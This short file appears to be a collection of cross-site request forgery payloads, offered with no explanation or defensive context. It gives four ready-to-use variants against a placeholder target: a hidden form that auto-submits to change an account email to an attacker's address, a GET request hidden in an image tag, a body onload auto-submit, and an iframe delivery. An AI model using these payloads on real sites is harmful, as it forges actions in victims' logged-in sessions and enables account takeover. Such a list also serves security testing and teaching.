# CSRF Payload Collection

## POST Form

<form action="https://target/action" method="POST">
<input type="hidden" name="email" value="attacker@example.com">
</form>

<script>
document.forms[0].submit();
</script>

---

## GET Request

<img src="https://target/action?email=attacker@example.com">

---

## Auto Submit

<body onload="document.forms[0].submit()">

---

## Iframe Delivery

<iframe src="https://target/action"></iframe>